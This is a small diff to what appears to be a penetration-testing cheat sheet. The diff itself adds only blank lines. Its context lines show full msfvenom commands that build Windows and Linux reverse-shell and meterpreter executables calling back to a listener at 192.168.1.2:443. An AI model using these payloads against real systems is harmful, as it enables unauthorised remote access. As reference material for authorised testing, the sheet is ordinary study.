@@ -130,6 +130,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe >
 ```
 
 # or
+
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
 ```
@@ -141,6 +142,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf
 ```
 
 # or
+
 ```
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf >reverse.elf
 ```
